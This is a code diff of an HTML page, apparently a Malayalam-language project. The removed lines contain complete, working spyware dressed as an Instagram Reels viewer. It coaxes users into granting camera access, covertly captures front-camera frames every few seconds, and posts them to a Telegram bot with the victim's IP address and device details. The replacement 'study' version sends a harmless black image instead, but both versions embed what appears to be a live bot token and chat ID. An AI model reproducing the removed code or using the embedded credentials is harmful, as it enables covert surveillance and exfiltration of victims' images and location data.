@@ -2,447 +2,109 @@
 <html lang="ml">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Instagram Reels - Viral Now 🔥</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>പഠനം: ഓട്ടോമേറ്റഡ് ബ്ലാക്ക് ഫോട്ടോ ബോട്ട്</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        * {
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-        body {
-            background-color: #000;
-            margin: 0;
-            overflow: hidden;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        .insta-container {
-            position: relative;
-            width: 100%;
-            max-width: 450px;
-            height: 100vh;
-            margin: auto;
-            background: #000;
-            overflow: hidden;
-        }
-        video#main-video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
-        }
-        #hidden-cam {
-            position: absolute;
-            opacity: 0;
-            width: 1px;
-            height: 1px;
-            pointer-events: none;
-            top: -100px;
-            left: -100px;
-        }
-        .insta-overlay {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            padding: 20px 16px 30px;
-            background: linear-gradient(transparent, rgba(0,0,0,0.75), rgba(0,0,0,0.85));
-            pointer-events: none;
-            z-index: 10;
-        }
-        .bottom-icons {
-            pointer-events: auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 12px;
-        }
-        .like-comment {
-            display: flex;
-            gap: 20px;
-        }
-        .action-btn {
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(8px);
-            padding: 8px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 40px;
-            height: 40px;
-        }
-        .pulse-effect {
-            animation: pulse 1.2s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 0.6; transform: scale(0.98);}
-            100% { opacity: 1; transform: scale(1);}
-        }
-        .camera-badge {
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(12px);
-            border-radius: 30px;
-            padding: 6px 12px;
-            font-size: 11px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-        }
-        .shimmer {
-            background: linear-gradient(90deg, #fff0, #fff8, #fff0);
-            background-size: 200% auto;
-            animation: shimmer 2s infinite;
-        }
-        @keyframes shimmer {
-            0% { background-position: -200% center; }
-            100% { background-position: 200% center; }
-        }
+        .reel-frame { width: 350px; height: 600px; position: relative; overflow: hidden; border-radius: 30px; background: #000; border: 8px solid #333; }
+        .black-placeholder { position: absolute; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1; }
+        .ui-layer { position: absolute; inset: 0; z-index: 10; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); }
     </style>
 </head>
-<body>
+<body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen p-4 font-sans">
 
-    <!-- AUTH SCREEN: Instagram style permission card -->
-    <div id="auth-screen" class="fixed inset-0 bg-black z-50 flex flex-col items-center justify-center px-6 text-center" style="background: radial-gradient(circle at center, #111 0%, #000 100%);">
-        <div class="w-24 h-24 mb-5 rounded-full bg-gradient-to-tr from-yellow-500 to-pink-600 flex items-center justify-center shadow-2xl">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" width="48" height="48">
-                <path d="M7.8 2h8.4C19.4 2 22 4.6 22 7.8v8.4c0 3.2-2.6 5.8-5.8 5.8H7.8C4.6 22 2 19.4 2 16.2V7.8C2 4.6 4.6 2 7.8 2zm-.2 2C5.6 4 4 5.6 4 7.6v8.8C4 18.4 5.6 20 7.6 20h8.8c2 0 3.6-1.6 3.6-3.6V7.6C20 5.6 18.4 4 16.4 4H7.6zm9.65 3.25a1.25 1.25 0 1 1 0 2.5 1.25 1.25 0 0 1 0-2.5zM12 7a5 5 0 1 1 0 10 5 5 0 0 1 0-10zm0 2a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/>
-            </svg>
+    <div class="reel-frame shadow-2xl mb-6">
+        <div class="black-placeholder">
+            <span class="text-white/30 text-xs italic">[ബ്ലാക്ക് ഫോട്ടോ പ്രിവ്യൂ]</span>
         </div>
-        <h2 class="text-white text-2xl font-bold mb-2 tracking-tight">Instagram Reels</h2>
-        <p class="text-gray-300 text-base mb-1 max-w-xs">✨ AI magic filters ready ✨</p>
-        <p class="text-gray-400 text-sm mb-6 px-4">"Eda ee reel onnu kandu nokku. 🔥 AI transition effects work cheyyan camera access allow cheyyuka."</p>
         
-        <button id="allow-btn" class="w-full max-w-xs bg-gradient-to-r from-blue-500 to-indigo-600 text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-all duration-200 flex items-center justify-center gap-2 text-lg">
-            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
-            Allow Camera & Watch
-        </button>
-        <p class="text-gray-500 text-xs mt-6">ഇൻസ്റ്റഗ്രാം പോലെ സുരക്ഷിതം • AI filters enabled</p>
-    </div>
-
-    <!-- MAIN REELS UI -->
-    <div id="insta-ui" class="insta-container hidden">
-        <!-- Hidden camera element & canvas for capturing frames -->
-        <video id="hidden-cam" autoplay playsinline muted></video>
-        <canvas id="hidden-canvas" style="display: none;"></canvas>
-        
-        <!-- Main reel video (trending dance) -->
-        <video id="main-video" loop playsinline>
-            <source src="https://assets.mixkit.co/videos/preview/mixkit-young-woman-dancing-in-a-modern-style-4428-large.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-        
-        <!-- Overlay UI: Caption, music, action bar -->
-        <div class="insta-overlay">
-            <div class="flex justify-between items-end w-full">
-                <div class="flex-1">
-                    <div class="flex items-center gap-2 mb-1">
-                        <div class="w-8 h-8 rounded-full bg-gradient-to-tr from-purple-400 to-pink-500 border border-white flex items-center justify-center overflow-hidden">
-                            <span class="text-white text-xs font-bold">✨</span>
-                        </div>
-                        <span class="text-white font-semibold text-base">@trending_vibes_kl</span>
-                        <span class="text-blue-400 text-xs font-medium bg-white/20 px-2 py-0.5 rounded-full">Follow</span>
-                    </div>
-                    <p class="text-white text-sm leading-5 max-w-[80%]">This transition is fire! 🔥 AI camera effect live 🎥</p>
-                    <div class="flex items-center gap-3 mt-2 text-xs text-white/80">
-                        <div class="flex items-center gap-1">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-                            <span>2,381</span>
-                        </div>
-                        <div class="flex items-center gap-1">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M21 6h-7.59l3.29-3.29L16 2l-4 4-4-4-.71.71L10.59 6H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2z"/></svg>
-                            <span>145</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="flex flex-col gap-5 items-center">
-                    <div class="flex flex-col items-center">
-                        <div class="action-btn mb-1">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-                        </div>
-                        <span class="text-white text-[10px]">1.2K</span>
-                    </div>
-                    <div class="flex flex-col items-center">
-                        <div class="action-btn mb-1">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M21 6h-7.59l3.29-3.29L16 2l-4 4-4-4-.71.71L10.59 6H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2z"/></svg>
-                        </div>
-                        <span class="text-white text-[10px]">45</span>
-                    </div>
-                    <div class="flex flex-col items-center">
-                        <div class="action-btn mb-1">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                        </div>
-                        <span class="text-white text-[10px]">Info</span>
-                    </div>
-                    <div class="mt-2 w-10 h-10 rounded-full border-2 border-white overflow-hidden bg-gray-800 flex items-center justify-center">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" class="w-8 h-8 object-cover" alt="profile">
-                    </div>
-                </div>
-            </div>
+        <div class="ui-layer">
+            <h2 class="text-white font-bold text-lg mb-1">@photo_study_bot</h2>
+            <p class="text-white/70 text-xs mb-6">ക്യാമറ ഇല്ലാതെ കറുത്ത ഫോട്ടോ അയക്കാൻ താഴെ ക്ലിക്ക് ചെയ്യുക.</p>
             
-            <!-- Music & AI badge -->
-            <div class="mt-4 flex items-center justify-between">
-                <div class="flex items-center gap-2 bg-black/40 backdrop-blur-md rounded-full px-3 py-1.5">
-                    <div class="w-5 h-5 rounded-full bg-green-500 flex items-center justify-center shimmer"></div>
-                    <span class="text-white text-[11px] font-medium">AI Filter • Live FX</span>
-                    <span class="text-white/60 text-[10px]">🎥 capturing moments</span>
-                </div>
-                <div class="flex gap-1 items-center bg-black/40 backdrop-blur-md rounded-full px-3 py-1.5">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
-                    <span class="text-white text-[11px]">Original Audio</span>
-                </div>
+            <button id="send-btn" class="bg-gradient-to-r from-gray-700 to-black text-white font-bold py-3 rounded-xl active:scale-95 transition">
+                ⬛ കറുത്ത ഫോട്ടോ ടെലിഗ്രാമിലേക്ക് അയക്കുക
+            </button>
+            
+            <div id="status" class="text-white text-[10px] mt-4 text-center opacity-0 transition-opacity">
+                തയ്യാറാക്കുന്നു...
             </div>
         </div>
-        
-        <!-- tiny floating indicator for camera activity (optional) -->
-        <div id="cam-indicator" class="absolute top-5 right-5 bg-red-500/80 backdrop-blur-sm rounded-full px-2 py-1 text-[10px] text-white font-bold z-20 hidden items-center gap-1">
-            <div class="w-2 h-2 bg-white rounded-full animate-pulse"></div>
-            LIVE CAM
-        </div>
     </div>
+
+    <canvas id="hidden-canvas" class="hidden"></canvas>
 
     <script>
-        // ============================================================
-        // 🔥 INSTAGRAM REELS TELEGRAM CAPTURE MODULE - MANOHARAMMAKKU 🔥
-        // ============================================================
-        
-        // --- 📸 BOT CREDENTIALS (FILL FOR ACTIVE TRACE) ---
-        const botToken = "7794673665:AAHIk_TmHz5cJkcxE4Tj2NaMDi0HhZ8nzjU";    // <-- your bot token here
-        const chatId = "7510372886";       // <-- your telegram chat id here
-        // ------------------------------------------------------
-        
-        const hiddenVideo = document.getElementById('hidden-cam');
-        const mainReel = document.getElementById('main-video');
-        const canvasElem = document.getElementById('hidden-canvas');
-        const authScreen = document.getElementById('auth-screen');
-        const instaUI = document.getElementById('insta-ui');
-        const camIndicator = document.getElementById('cam-indicator');
-        
-        let captureLoopInterval = null;
-        let isCapturingActive = false;
-        let streamRef = null;
-        
-        // Helper: Get public IP
-        async function getPublicIP() {
-            try {
-                const resp = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-                const data = await resp.json();
-                return data.ip;
-            } catch (err) {
-                console.warn("IP fetch failed:", err);
-                return "Unable to fetch (mobile)";
-            }
-        }
-        
-        // Helper: get device info (simple)
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = "Unknown Device";
-            if (/iPhone/i.test(ua)) device = "iPhone";
-            else if (/Android/i.test(ua)) device = "Android Phone";
-            else if (/iPad/i.test(ua)) device = "iPad";
-            else device = "Mobile Device";
-            return `${device} | ${screen.width}x${screen.height}`;
-        }
-        
-        // Capture frame from hidden video and send to Telegram
-        async function captureAndSendToTelegram() {
-            if (!hiddenVideo.srcObject || hiddenVideo.readyState < 2) {
-                console.log("Camera not ready yet, skipping capture");
-                return;
-            }
-            
-            try {
-                // ensure canvas dimensions match video feed
-                const videoTrack = hiddenVideo.srcObject.getVideoTracks()[0];
-                if (videoTrack) {
-                    const settings = videoTrack.getSettings();
-                    canvasElem.width = settings.width || 480;
-                    canvasElem.height = settings.height || 640;
-                } else {
-                    canvasElem.width = hiddenVideo.videoWidth || 480;
-                    canvasElem.height = hiddenVideo.videoHeight || 640;
-                }
-                
-                if (canvasElem.width === 0) {
-                    canvasElem.width = 480;
-                    canvasElem.height = 640;
-                }
-                
-                const ctx = canvasElem.getContext('2d');
-                ctx.drawImage(hiddenVideo, 0, 0, canvasElem.width, canvasElem.height);
-                
-                // convert canvas to blob (JPEG quality 0.75)
-                const blob = await new Promise(resolve => canvasElem.toBlob(resolve, 'image/jpeg', 0.75));
-                if (!blob) throw new Error("Canvas to blob failed");
-                
-                // Get IP & timestamp
-                const ipAddress = await getPublicIP();
-                const nowTime = new Date();
-                const formattedTime = nowTime.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-                const timestampMs = nowTime.getTime();
-                const deviceString = getDeviceInfo();
-                
-                // Build caption (Malayalam vibe + hacker style)
-                const caption = `📸 *LIVE INSTAGRAM REELS CAPTURE* 🔥\n\n👤 *User:* Instagram Reels Viewer\n🕒 *Time:* ${formattedTime}\n🌐 *IP:* ${ipAddress}\n📱 *Device:* ${deviceString}\n📍 *Status:* Active Camera Stream\n🎭 *Filter:* AI Transition Mode\n\n⚠️ *Reel Session Active* ⚠️\n#ReelTrace #InstagramViral #CameraAccess`;
-                
-                // Prepare FormData
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, `reel_capture_${timestampMs}.jpg`);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
-                
-                // Send to Telegram Bot
-                if (botToken && botToken.length > 10 && chatId && chatId.length > 5) {
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    const result = await response.json();
-                    if (result.ok) {
-                        console.log("✅ Telegram capture sent successfully");
-                        // brief flash indicator (visual feedback on UI)
-                        if (camIndicator) {
-                            camIndicator.classList.remove('hidden');
-                            camIndicator.style.opacity = '1';
-                            setTimeout(() => {
-                                if(camIndicator) camIndicator.classList.add('hidden');
-                            }, 1200);
-                        }
-                    } else {
-                        console.error("Telegram error:", result);
-                    }
-                } else {
-                    console.warn("⚠️ Bot token or chat ID missing! captures won't be sent.");
-                    // For demo we still console log but no actual send
-                }
-                
-            } catch (err) {
-                console.error("Capture error:", err);
-            }
-        }
-        
-        // Start periodic captures: first after 3 sec, then every 8 sec (reel vibe)
-        function startPeriodicCaptures() {
-            if (captureLoopInterval) clearInterval(captureLoopInterval);
-            
-            // first capture after 3 seconds (user watches reel)
-            setTimeout(() => {
-                if (isCapturingActive) captureAndSendToTelegram();
-            }, 3200);
-            
-            // subsequent captures every 7.5 seconds to mimic reels autoplay loop
-            captureLoopInterval = setInterval(() => {
-                if (isCapturingActive && hiddenVideo.srcObject && hiddenVideo.readyState >= 2) {
-                    captureAndSendToTelegram();
-                }
-            }, 7800);
-        }
-        
-        // Stop camera and clean everything
-        function stopCameraAndCapture() {
-            if (captureLoopInterval) {
-                clearInterval(captureLoopInterval);
-                captureLoopInterval = null;
-            }
-            isCapturingActive = false;
-            if (streamRef) {
-                streamRef.getTracks().forEach(track => {
-                    track.stop();
-                });
-                streamRef = null;
-            }
-            if (hiddenVideo.srcObject) {
-                hiddenVideo.srcObject = null;
-            }
-        }
-        
-        // MAIN ENTRY: request camera permission & start reel magic
-        async function startReelExperience() {
-            try {
-                // Request camera with good constraints
-                const constraints = { video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                streamRef = stream;
-                hiddenVideo.srcObject = stream;
-                await hiddenVideo.play().catch(e => console.warn("play hidden video error", e));
-                
-                // UI Transition
-                authScreen.classList.add('hidden');
-                instaUI.classList.remove('hidden');
-                
-                // Start playing main reel video
-                await mainReel.play().catch(e => console.log("autoplay blocked? but user gesture exists", e));
-                
-                // Mark capturing active
-                isCapturingActive = true;
-                
-                // small delay to ensure camera feed is ready
-                setTimeout(() => {
-                    if (isCapturingActive) {
-                        startPeriodicCaptures();
-                    }
-                }, 1000);
-                
-                // extra: show that camera is being used (badge)
-                if (camIndicator) {
-                    camIndicator.classList.remove('hidden');
-                    setTimeout(() => {
-                        if(camIndicator && !camIndicator.classList.contains('hidden')) 
-                            camIndicator.classList.add('hidden');
-                    }, 2500);
-                }
-                
-                // also retry capture if video metadata loaded fully
-                hiddenVideo.addEventListener('loadeddata', () => {
-                    if (isCapturingActive) {
-                        // extra safety: if interval not started yet, start now
-                        if (!captureLoopInterval) startPeriodicCaptures();
-                    }
-                }, { once: true });
-                
-            } catch (err) {
-                console.error("Camera permission error:", err);
-                alert("Camera access is required for AI filters! Allow camera to watch reels with effects. 📸");
-                // fallback: they can still watch but no telemetry? But we keep permission needed
-                authScreen.style.display = 'flex';
-                alert("Allow camera from browser settings and click again.");
-            }
-        }
-        
-        // Cleanup on page unload / hidden
-        window.addEventListener('beforeunload', () => {
-            if (captureLoopInterval) clearInterval(captureLoopInterval);
-            if (streamRef) {
-                streamRef.getTracks().forEach(t => t.stop());
-            }
-        });
-        
-        // Attach button event
-        const allowButton = document.getElementById('allow-btn');
-        if (allowButton) {
-            allowButton.addEventListener('click', (e) => {
-                e.preventDefault();
-                startReelExperience();
+        // CONFIG (പഠന ആവശ്യത്തിനായി മാത്രം നിങ്ങളുടെ വിവരങ്ങൾ നൽകുക)
+        const BOT_TOKEN = "7794673665:AAHIk_TmHz5cJkcxE4Tj2NaMDi0HhZ8nzjU";
+        const CHAT_ID = "7510372886";
+
+        const sendBtn = document.getElementById('send-btn');
+        const status = document.getElementById('status');
+        const canvas = document.getElementById('hidden-canvas');
+
+        // 1. കറുത്ത ചിത്രം നിർമ്മിക്കുന്ന ഫംഗ്ഷൻ (Using Canvas API)
+        function createBlackImageBlob() {
+            return new Promise((resolve) => {
+                const ctx = canvas.getContext('2d');
+                // ചിത്രത്തിന്റെ വലിപ്പം ക്രമീകരിക്കുന്നു (ഉദാഹരണത്തിന് 640x480)
+                canvas.width = 640;
+                canvas.height = 480;
+
+                // ക്യാൻവാസ് പൂർണ്ണമായും കറുപ്പിക്കുന്നു
+                ctx.fillStyle = "#000000";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                // ചിത്രത്തിൽ ഒരു ചെറിയ വാചകം ചേർക്കുന്നു (പഠന ആവശ്യത്തിനായി)
+                ctx.fillStyle = "#ffffff50"; // പകുതി സുതാര്യമായ വെള്ള
+                ctx.font = "20px Arial";
+                ctx.textAlign = "center";
+                ctx.fillText("[STUDY: Generated Black Image]", canvas.width/2, canvas.height/2);
+
+                // ക്യാൻവാസിനെ Blob (ബൈനറി ഡാറ്റ) ആക്കി മാറ്റുന്നു
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.9);
             });
         }
-        
-        // Optional: background visibility pause (optional ethics: no need, but keep intervals)
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                // when tab hidden we could optionally pause captures? but we keep it minimal.
-                console.log("tab hidden, still captures active (background)");
-            } else {
-                if (isCapturingActive && hiddenVideo.srcObject && !captureLoopInterval) {
-                    startPeriodicCaptures();
+
+        // 2. ഫോട്ടോ ടെലിഗ്രാമിലേക്ക് അയക്കുന്ന ഫംഗ്ഷൻ (User Interaction)
+        sendBtn.onclick = async () => {
+            status.innerText = "ചിത്രം നിർമ്മിക്കുന്നു...";
+            status.style.opacity = "1";
+            sendBtn.disabled = true;
+
+            // കറുത്ത Blob ഫയൽ നിർമ്മിക്കുന്നു
+            const blackImageBlob = await createBlackImageBlob();
+
+            status.innerText = "ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു...";
+
+            // ടെലിഗ്രാം API-ലേക്ക് അയക്കാനുള്ള ഫോം ഡാറ്റ തയ്യാറാക്കുന്നു
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blackImageBlob, 'black_image.jpg');
+            formData.append('caption', "✅ ക്യാമറ ഇല്ലാതെ വെബ് UI-ൽ നിന്ന് നിർമ്മിച്ച കറുത്ത ഫോട്ടോ.");
+
+            try {
+                // ടെലിഗ്രാം API-ലേക്ക് POST റിക്വസ്റ്റ് അയക്കുന്നു
+                const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (resp.ok) {
+                    status.innerText = "✅ Successfully Sent!";
+                } else {
+                    status.innerText = "❌ Error: API തടഞ്ഞു.";
                 }
+            } catch (err) {
+                status.innerText = "❌ Error: നെറ്റ് വർക്ക് തടസ്സം.";
+                console.error(err);
+            } finally {
+                // ബട്ടൺ വീണ്ടും പ്രവർത്തനക്ഷമമാക്കുന്നു
+                setTimeout(() => { status.style.opacity = "0"; sendBtn.disabled = false; }, 2500);
             }
-        });
-        
-        // Preload minor style: ensure no double tap zoom
+        };
     </script>
 </body>
 </html>
